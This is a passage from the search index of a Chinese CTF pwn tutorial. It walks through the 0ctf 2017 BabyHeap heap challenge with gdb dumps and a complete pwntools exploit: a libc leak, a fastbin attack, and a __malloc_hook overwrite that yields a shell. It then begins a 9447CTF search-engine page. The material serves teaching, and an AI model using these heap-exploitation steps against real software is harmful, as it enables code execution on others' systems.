0x0000555555757070\n0xafc96656520:  0x0000000000000001  0x0000000000000080   -- idx 4 -  chunk 4\n0xafc96656530:  0x0000555555757090  0x0000000000000001   -- idx 5 -  chunk 5\n0xafc96656540:  0x0000000000000080  0x0000555555757120\n0xafc96656550:  0x0000000000000000  0x0000000000000000  \u8fd9\u65f6\uff0c\u5982\u679c\u6211\u4eec\u5c06 chunk 4 \u91ca\u653e\u6389\uff0c\u5176 fd \u6307\u9488\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u6307\u5411 unsorted bin \u94fe\u8868\u7684\u5934\u90e8\uff0c\u8fd9\u4e2a\u5730\u5740\u5728 libc \u4e2d\uff0c\u4e14\u76f8\u5bf9\u4f4d\u7f6e\u56fa\u5b9a\uff0c\u5229\u7528\u5b83\u5c31\u53ef\u4ee5\u7b97\u51fa libc \u88ab\u52a0\u8f7d\u7684\u5730\u5740\uff1a free ( 4 )   gef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena  main_arena  ]\n[+] unsorted_bins[0]: fw=0x555555757080, bk=0x555555757080\n \u2192   Chunk(addr=0x555555757090, size=0x90, flags=PREV_INUSE)\ngef\u27a4  x/60gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021   -- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021   -- new chunk 1\n0x555555757050: 0x4242424242424242  0x4242424242424242\n0x555555757060: 0x0000000000000000  0x0000000000000021   -- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000091   -- chunk 4 [be freed], new chunk 2  -- unsorted bin\n0x555555757090: 0x00007ffff7dd1b78  0x00007ffff7dd1b78       -- fd, bk pointer\n0x5555557570a0: 0x0000000000000000  0x4141414141414141\n0x5555557570b0: 0x4141414141414141  0x4141414141414141\n0x5555557570c0: 0x4141414141414141  0x4141414141414141\n0x5555557570d0: 0x4141414141414141  0x4141414141414141\n0x5555557570e0: 0x4141414141414141  0x4141414141414141\n0x5555557570f0: 0x4141414141414141  0x4141414141414141\n0x555555757100: 0x4141414141414141  0x4141414141414141\n0x555555757110: 0x0000000000000090  0x0000000000000090   -- chunk 5\n0x555555757120: 0x4141414141414141  0x4141414141414141\n0x555555757130: 0x4141414141414141  0x4141414141414141\n0x555555757140: 0x4141414141414141  0x4141414141414141\n0x555555757150: 0x4141414141414141  0x4141414141414141\n0x555555757160: 0x4141414141414141  0x4141414141414141\n0x555555757170: 0x4141414141414141  0x4141414141414141\n0x555555757180: 0x4141414141414141  0x4141414141414141\n0x555555757190: 0x4141414141414141  0x4141414141414141\n0x5555557571a0: 0x0000000000000000  0x0000000000020e61\n0x5555557571b0: 0x0000000000000000  0x0000000000000000\n0x5555557571c0: 0x0000000000000000  0x0000000000000000\n0x5555557571d0: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/20gx 0xafc966564d0-0x10\n0xafc966564c0:  0x0000000000000001  0x0000000000000010   -- idx 0 -  chunk 0\n0xafc966564d0:  0x0000555555757010  0x0000000000000001   -- idx 1 -  new chunk 1\n0xafc966564e0:  0x0000000000000010  0x0000555555757050\n0xafc966564f0:  0x0000000000000001  0x0000000000000010   -- idx 2 -  new chunk 2\n0xafc96656500:  0x0000555555757090  0x0000000000000001   -- idx 3 -  chunk 3\n0xafc96656510:  0x0000000000000010  0x0000555555757070\n0xafc96656520:  0x0000000000000000  0x0000000000000000\n0xafc96656530:  0x0000000000000000  0x0000000000000001   -- idx 5 -  chunk 5\n0xafc96656540:  0x0000000000000080  0x0000555555757120\n0xafc96656550:  0x0000000000000000  0x0000000000000000  \u6700\u540e\u5229\u7528 Dump \u64cd\u4f5c\u5373\u53ef\u5c06\u5730\u5740\u6cc4\u6f0f\u51fa\u6765\uff1a leak   =   u64 ( dump ( 2 )[: 8 ])  libc   =   leak   -   0x3c4b78            # 0x3c4b78 = leak - libc  __malloc_hook   =   libc   -   0x3c4b10      # readelf -s libc.so.6 | grep __malloc_hook@  one_gadget   =   libc   -   0x4526a   [*] leak =  0x7ffff7dd1b78\n[*] libc =  0x7ffff7a0d000\n[*] __malloc_hook =  0x7ffff7dd1b10\n[*] one_gadget =  0x7ffff7a5226a", 
            "title": "leak libc"
        }, 
        {
            "location": "/pwn/lab/6.1.10_0ctf2017_babyheap2017/#get-shell", 
            "text": "\u7531\u4e8e\u5f00\u542f\u4e86 Full RELRO\uff0c\u6539\u5199 GOT \u8868\u662f\u4e0d\u884c\u4e86\u3002\u8003\u8651\u7528  __malloc_hook \uff0c\u5b83\u662f\u4e00\u4e2a\u5f31\u7c7b\u578b\u7684\u51fd\u6570\u6307\u9488\u53d8\u91cf\uff0c\u6307\u5411  void * function(size_t size, void * caller) \uff0c\u5f53\u8c03\u7528 malloc() \u65f6\uff0c\u9996\u5148\u5224\u65ad hook \u51fd\u6570\u6307\u9488\u662f\u5426\u4e3a\u7a7a\uff0c\u4e0d\u4e3a\u7a7a\u5219\u8c03\u7528\u5b83\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u4f20\u5165\u4e00\u4e2a one-gadget \u5373\u53ef\uff08\u8be6\u60c5\u8bf7\u67e5\u770b\u7ae0\u82824.6\uff09\u3002  \u9996\u5148\u8003\u8651\u600e\u6837\u5229\u7528 fastbins \u5728  __malloc_hook  \u6307\u5411\u7684\u5730\u5740\u5904\u5199\u5165 one_gadget \u7684\u5730\u5740\u3002\u8fd9\u91cc\u6709\u4e00\u4e2a\u6280\u5de7\uff0c\u5730\u5740\u504f\u79fb\uff0c\u5c31\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\u4e00\u4e2a fake chunk\uff0c\u5176\u5927\u5c0f\u4e3a 0x7f\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a fast chunk\uff1a gef\u27a4  x/10gx (long long)( main_arena)-0x30\n0x7ffff7dd1af0  _IO_wide_data_0+304 :   0x00007ffff7dd0260  0x0000000000000000\n0x7ffff7dd1b00  __memalign_hook :   0x00007ffff7a92e20  0x00007ffff7a92a00\n0x7ffff7dd1b10  __malloc_hook : 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b20  main_arena :    0x0000000000000000  0x4141414141414141   -- target\n0x7ffff7dd1b30  main_arena+16 : 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/10gx (long long)( main_arena)-0x30+0xd\n0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f       -- fake chunk\n0x7ffff7dd1b0d: 0x000000000000007f  0x0000000000000000\n0x7ffff7dd1b1d: 0x0000000000000000  0x4141414141000000\n0x7ffff7dd1b2d: 0x0000000000414141  0x0000000000000000\n0x7ffff7dd1b3d: 0x0000000000000000  0x0000000000000000 \n\u7528\u672c\u5730\u7684\u6cc4\u9732\u5730\u5740\u51cf\u53bb libc \u5730\u5740\u5f97\u5230\u504f\u79fb\uff1a [0x00000000]  ?v 0x7ffff7dd1b78 - 0x7ffff7a0d000\n0x3c4b78  \u4e4b\u524d free \u6389\u7684 chunk 4 \u4e00\u4e2a small chunk\uff0c\u88ab\u6dfb\u52a0\u5230\u4e86 unsorted bin \u4e2d\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u7684\u662f fast chunk\uff0c\u6240\u4ee5\u8fd9\u91cc\u91c7\u7528\u5206\u914d\u4e00\u4e2a fast chunk\uff0c\u518d\u91ca\u653e\u6389\u7684\u529e\u6cd5\uff0c\u5c06\u5176\u6dfb\u52a0\u5230 fast bins \u4e2d\u3002\u7136\u540e\u6539\u5199\u5b83\u7684 fd \u6307\u9488\u6307\u5411 fake chunk\uff08\u5f53\u7136\u4e5f\u8981\u901a\u8fc7 libc \u504f\u79fb\u8ba1\u7b97\u51fa\u6765\uff09\uff1a alloc ( 0x60 )  free ( 4 )  payload   =   p64 ( libc   +   0x3c4afd )  fill ( 2 ,   payload )   gef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena  main_arena  ]\n[+] unsorted_bins[0]: fw=0x5555557570f0, bk=0x5555557570f0\n \u2192   Chunk(addr=0x555555757100, size=0x20, flags=PREV_INUSE)\ngef\u27a4  x/60gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021   -- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021   -- new chunk 1\n0x555555757050: 0x4242424242424242  0x4242424242424242\n0x555555757060: 0x0000000000000000  0x0000000000000021   -- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000071   -- new chunk 2, new chunk 4 [be freed]\n0x555555757090: 0x00007ffff7dd1afd  0x0000000000000000       -- fd pointer\n0x5555557570a0: 0x0000000000000000  0x0000000000000000\n0x5555557570b0: 0x0000000000000000  0x0000000000000000\n0x5555557570c0: 0x0000000000000000  0x0000000000000000\n0x5555557570d0: 0x0000000000000000  0x0000000000000000\n0x5555557570e0: 0x0000000000000000  0x0000000000000000\n0x5555557570f0: 0x0000000000000000  0x0000000000000021       -- unsorted bin\n0x555555757100: 0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x555555757110: 0x0000000000000020  0x0000000000000090   -- chunk 5\n0x555555757120: 0x4141414141414141  0x4141414141414141\n0x555555757130: 0x4141414141414141  0x4141414141414141\n0x555555757140: 0x4141414141414141  0x4141414141414141\n0x555555757150: 0x4141414141414141  0x4141414141414141\n0x555555757160: 0x4141414141414141  0x4141414141414141\n0x555555757170: 0x4141414141414141  0x4141414141414141\n0x555555757180: 0x4141414141414141  0x4141414141414141\n0x555555757190: 0x4141414141414141  0x4141414141414141\n0x5555557571a0: 0x0000000000000000  0x0000000000020e61\n0x5555557571b0: 0x0000000000000000  0x0000000000000000\n0x5555557571c0: 0x0000000000000000  0x0000000000000000\n0x5555557571d0: 0x0000000000000000  0x0000000000000000  \u8fde\u7eed\u4e24\u6b21\u5206\u914d\uff0c\u7b2c\u4e00\u6b21\u5c06 fake chunk \u6dfb\u52a0\u5230 fast bins\uff0c\u7b2c\u4e8c\u6b21\u5206\u914d fake chunk\uff0c\u5206\u522b\u662f new new chunk 4 \u548c chunk 6\u3002\u7136\u540e\u5c31\u53ef\u4ee5\u6539\u5199  __malloc_hook  \u7684\u5730\u5740\uff0c\u5c06\u5176\u6307\u5411 one-gadget\uff1a alloc ( 0x60 )  alloc ( 0x60 )  payload    =   p8 ( 0 ) * 3  payload   +=   p64 ( one_gadget )  fill ( 6 ,   payload )   gef\u27a4  x/10gx (long long)( main_arena)-0x30\n0x7ffff7dd1af0  _IO_wide_data_0+304 :   0x00007ffff7dd0260  0x0000000000000000\n0x7ffff7dd1b00  __memalign_hook :   0x00007ffff7a92e20  0x000000fff7a92a00\n0x7ffff7dd1b10  __malloc_hook : 0x00007ffff7a5226a  0x0000000000000000   -- target\n0x7ffff7dd1b20  main_arena :    0x0000000000000000  0x4141414141414141\n0x7ffff7dd1b30  main_arena+16 : 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/60gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021   -- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021   -- new chunk 1\n0x555555757050: 0x4242424242424242  0x4242424242424242\n0x555555757060: 0x0000000000000000  0x0000000000000021   -- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000071   -- new chunk 2, new new chunk 4\n0x555555757090: 0x0000000000000000  0x0000000000000000\n0x5555557570a0: 0x0000000000000000  0x0000000000000000\n0x5555557570b0: 0x0000000000000000  0x0000000000000000\n0x5555557570c0: 0x0000000000000000  0x0000000000000000\n0x5555557570d0: 0x0000000000000000  0x0000000000000000\n0x5555557570e0: 0x0000000000000000  0x0000000000000000\n0x5555557570f0: 0x0000000000000000  0x0000000000000021       -- unsorted bin\n0x555555757100: 0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x555555757110: 0x0000000000000020  0x0000000000000090   -- chunk 5\n0x555555757120: 0x4141414141414141  0x4141414141414141\n0x555555757130: 0x4141414141414141  0x4141414141414141\n0x555555757140: 0x4141414141414141  0x4141414141414141\n0x555555757150: 0x4141414141414141  0x4141414141414141\n0x555555757160: 0x4141414141414141  0x4141414141414141\n0x555555757170: 0x4141414141414141  0x4141414141414141\n0x555555757180: 0x4141414141414141  0x4141414141414141\n0x555555757190: 0x4141414141414141  0x4141414141414141\n0x5555557571a0: 0x0000000000000000  0x0000000000020e61\n0x5555557571b0: 0x0000000000000000  0x0000000000000000\n0x5555557571c0: 0x0000000000000000  0x0000000000000000\n0x5555557571d0: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/30gx 0xafc966564d0-0x10\n0xafc966564c0:  0x0000000000000001  0x0000000000000010   -- idx 0 -  chunk 0\n0xafc966564d0:  0x0000555555757010  0x0000000000000001   -- idx 1 -  new chunk 1\n0xafc966564e0:  0x0000000000000010  0x0000555555757050\n0xafc966564f0:  0x0000000000000001  0x0000000000000010   -- idx 2 -  new chunk 2\n0xafc96656500:  0x0000555555757090  0x0000000000000001   -- idx 3 -  chunk 3\n0xafc96656510:  0x0000000000000010  0x0000555555757070\n0xafc96656520:  0x0000000000000001  0x0000000000000060   -- idx 4 -  new new chunk4\n0xafc96656530:  0x0000555555757090  0x0000000000000001   -- idx 5 -  chunk 5\n0xafc96656540:  0x0000000000000080  0x0000555555757120\n0xafc96656550:  0x0000000000000001  0x0000000000000060   -- idx 6 -  chunk 6\n0xafc96656560:  0x00007ffff7dd1b0d  0x0000000000000000\n0xafc96656570:  0x0000000000000000  0x0000000000000000\n0xafc96656580:  0x0000000000000000  0x0000000000000000\n0xafc96656590:  0x0000000000000000  0x0000000000000000\n0xafc966565a0:  0x0000000000000000  0x0000000000000000  \u6700\u540e\uff0c\u53ea\u8981\u8c03\u7528\u4e86 malloc\uff0c\u5c31\u4f1a\u89e6\u53d1 hook \u51fd\u6570\uff0c\u5373 one-gadget\u3002\u73b0\u5728\u53ef\u4ee5\u5f00\u542f ASLR \u4e86\uff0c\u56e0\u4e3a\u901a\u8fc7\u6cc4\u6f0f libc \u5730\u5740\uff0c\u6211\u4eec\u5df2\u7ecf\u5b8c\u5168\u7ed5\u8fc7\u4e86\u5b83\u3002  Bingo!!! $ python exp.py\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] leak =  0x7f8c1be9eb78\n[*] libc =  0x7f8c1bada000\n[*] __malloc_hook =  0x7f8c1be9eb10\n[*] one_gadget =  0x7f8c1bb1f26a\n[*] Switching to interactive mode\n$ whoami\nfirmy  \u672c\u9898\u591a\u6b21\u4f7f\u7528 fastbin attack\uff0c\u786e\u5b9e\u7ecf\u5178\u3002", 
            "title": "get shell"
        }, 
        {
            "location": "/pwn/lab/6.1.10_0ctf2017_babyheap2017/#exploit", 
            "text": "\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a from   pwn   import   *  io   =   remote ( 127.0.0.1 ,   10001 )  def   alloc ( size ): \n     io . recvuntil ( Command:  ) \n     io . sendline ( 1 ) \n     io . recvuntil ( Size:  ) \n     io . sendline ( str ( size ))  def   fill ( idx ,   cont ): \n     io . recvuntil ( Command:  ) \n     io . sendline ( 2 ) \n     io . recvuntil ( Index:  ) \n     io . sendline ( str ( idx )) \n     io . recvuntil ( Size:  ) \n     io . sendline ( str ( len ( cont ))) \n     io . recvuntil ( Content:  ) \n     io . send ( cont )  def   free ( idx ): \n     io . recvuntil ( Command:  ) \n     io . sendline ( 3 ) \n     io . recvuntil ( Index:  ) \n     io . sendline ( str ( idx ))  def   dump ( idx ): \n     io . recvuntil ( Command:  ) \n     io . sendline ( 4 ) \n     io . recvuntil ( Index:  ) \n     io . sendline ( str ( idx )) \n     io . recvuntil ( Content:  \\n ) \n     data   =   io . recvline () \n     return   data  alloc ( 0x10 )  alloc ( 0x10 )  alloc ( 0x10 )  alloc ( 0x10 )  alloc ( 0x80 )  #fill(0,  A *16)  #fill(1,  A *16)  #fill(2,  A *16)  #fill(3,  A *16)  #fill(4,  A *128)  free ( 1 )  free ( 2 )  payload    =   A * 16  payload   +=   p64 ( 0 )  payload   +=   p64 ( 0x21 )  payload   +=   p64 ( 0 )  payload   +=   A * 8  payload   +=   p64 ( 0 )  payload   +=   p64 ( 0x21 )  payload   +=   p8 ( 0x80 )  fill ( 0 ,   payload )  payload    =   A * 16  payload   +=   p64 ( 0 )  payload   +=   p64 ( 0x21 )  fill ( 3 ,   payload )  alloc ( 0x10 )  alloc ( 0x10 )  #fill(1,  B *16)  #fill(2,  C *16)  #fill(4,  D *16)  payload    =   A * 16  payload   +=   p64 ( 0 )  payload   +=   p64 ( 0x91 )  fill ( 3 ,   payload )  alloc ( 0x80 )  #fill(5,  A *128)  free ( 4 )  leak   =   u64 ( dump ( 2 )[: 8 ])  libc   =   leak   -   0x3c4b78            # 0x3c4b78 = leak - libc  __malloc_hook   =   libc   +   0x3c4b10      # readelf -s libc.so.6 | grep __malloc_hook@  one_gadget   =   libc   +   0x4526a  log . info ( leak =  0x %x   %   leak )  log . info ( libc =  0x %x   %   libc )  log . info ( __malloc_hook =  0x %x   %   __malloc_hook )  log . info ( one_gadget =  0x %x   %   one_gadget )  alloc ( 0x60 )  free ( 4 )  payload   =   p64 ( libc   +   0x3c4afd )  fill ( 2 ,   payload )  alloc ( 0x60 )  alloc ( 0x60 )  payload    =   p8 ( 0 ) * 3  payload   +=   p64 ( one_gadget )  fill ( 6 ,   payload )  alloc ( 1 )  io . interactive ()", 
            "title": "exploit"
        }, 
        {
            "location": "/pwn/lab/6.1.10_0ctf2017_babyheap2017/#_3", 
            "text": "0ctf Quals 2017 - BabyHeap2017  how2heap", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }, 
        {
            "location": "/pwn/lab/6.1.11_9447ctf2015_search_engine/", 
            "text": "\u9898\u76ee\u590d\u73b0\n\n\n\u9898\u76ee\u89e3\u6790\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\n\u4e0b\u8f7d\u6587\u4ef6\n\n\n\u9898\u76ee\u590d\u73b0\n\n\n$ file search\nsearch: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped\n$ checksec -f search\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE\nPartial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes     1               3       search\n\n\n64 \u4f4d\u7a0b\u5e8f\uff0c\u5f00\u542f\u4e86 NX \u548c Canary\u3002\n\n\n\u73a9\u4e00\u4e0b\uff0c\u770b\u540d\u5b57\u5c31\u77e5\u9053\u662f\u4e00\u4e2a\u641c\u7d22\u5f15\u64ce\uff0c\u5927\u6982\u6d41\u7a0b\u662f\u8fd9\u6837\u7684\uff0c\u9996\u5148\u7ed9\u8bcd\u5e93\u52a0\u5165\u4e00\u4e9b\u53e5\u5b50\uff0c\u53e5\u5b50\u91cc\u7684\u5355\u8bcd\u4ee5\u7a7a\u683c\u95f4\u9694\u5f00\uff0c\u7136\u540e\u53ef\u4ee5\u641c\u7d22\u6240\u6709\u5305\u542b\u67d0\u5355\u8bcd\u7684\u53e5\u5b50\uff0c\u5f53\u627e\u5230\u67d0\u6761\u53e5\u5b50\u540e\uff0c\u5c06\u5176\u6253\u5370\u51fa\u6765\uff0c\u5e76\u8be2\u95ee\u662f\u5426\u5220\u9664\u3002\n\n$ ./search\n1: Search with a word\n2: Index a sentence\n3: Quit\n2\nEnter the sentence size:\n10\nEnter the sentence:\nhello aaaa\nAdded sentence\n1: Search with a word\n2: Index a sentence\n3: Quit\n2\nEnter the sentence size:\n10\nEnter the sentence:\nhello bbbb\nAdded sentence\n1: Search with a word\n2: Index a sentence\n3: Quit\n1\nEnter the word size:\n5\nEnter the word:\nhello\nFound 10: hello bbbb\nDelete this sentence (y/n)?\ny\nDeleted!\nFound 10: hello aaaa\nDelete this sentence (y/n)?\nn\n1: Search with a word\n2: Index a sentence\n3: Quit\n3\n\n\n\u6839\u636e\u7ecf\u9a8c\uff0c\u8fd9\u662f\u4e00\u9053\u5806\u5229\u7528\u7684\u9898\u76ee\u3002\n\n\n\u9898\u76ee\u89e3\u6790\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\nhow2heap", 
            "title": "9447CTF2015 Search-Engine"
        }, 
        {
            "location": "/pwn/lab/6.1.11_9447ctf2015_search_engine/#_1", 
            "text": "$ file search\nsearch: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped\n$ checksec -f search\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE\nPartial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes     1               3       search \n64 \u4f4d\u7a0b\u5e8f\uff0c\u5f00\u542f\u4e86 NX \u548c Canary\u3002  \u73a9\u4e00\u4e0b\uff0c\u770b\u540d\u5b57\u5c31\u77e5\u9053\u662f\u4e00\u4e2a\u641c\u7d22\u5f15\u64ce\uff0c\u5927\u6982\u6d41\u7a0b\u662f\u8fd9\u6837\u7684\uff0c\u9996\u5148\u7ed9\u8bcd\u5e93\u52a0\u5165\u4e00\u4e9b\u53e5\u5b50\uff0c\u53e5\u5b50\u91cc\u7684\u5355\u8bcd\u4ee5\u7a7a\u683c\u95f4\u9694\u5f00\uff0c\u7136\u540e\u53ef\u4ee5\u641c\u7d22\u6240\u6709\u5305\u542b\u67d0\u5355\u8bcd\u7684\u53e5\u5b50\uff0c\u5f53\u627e\u5230\u67d0\u6761\u53e5\u5b50\u540e\uff0c\u5c06\u5176\u6253\u5370\u51fa\u6765\uff0c\u5e76\u8be2\u95ee\u662f\u5426\u5220\u9664\u3002 $ ./search\n1: Search with a word\n2: Index a sentence\n3: Quit\n2\nEnter the sentence size:\n10\nEnter the sentence:\nhello aaaa\nAdded sentence\n1: Search with a word\n2: Index a sentence\n3: Quit\n2\nEnter the sentence size:\n10\nEnter the sentence:\nhello bbbb\nAdded sentence\n1: Search with a word\n2: Index a sentence\n3: Quit\n1\nEnter the word size:\n5\nEnter the word:\nhello\nFound 10: hello bbbb\nDelete this sentence (y/n)?\ny\nDeleted!\nFound 10: hello aaaa\nDelete this sentence (y/n)?\nn\n1: Search with a word\n2: Index a sentence\n3: Quit\n3 \n\u6839\u636e\u7ecf\u9a8c\uff0c\u8fd9\u662f\u4e00\u9053\u5806\u5229\u7528\u7684\u9898\u76ee\u3002", 
            "title": "\u9898\u76ee\u590d\u73b0"
        }, 
        {
            "location": "/pwn/lab/6.1.11_9447ctf2015_search_engine/#_2", 
            "text": "", 
            "title": "\u9898\u76ee\u89e3\u6790"
        }, 
        {
            "location": "/pwn/lab/6.1.11_9447ctf2015_search_engine/#_3", 
            "text": "how2heap", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }
    ]
}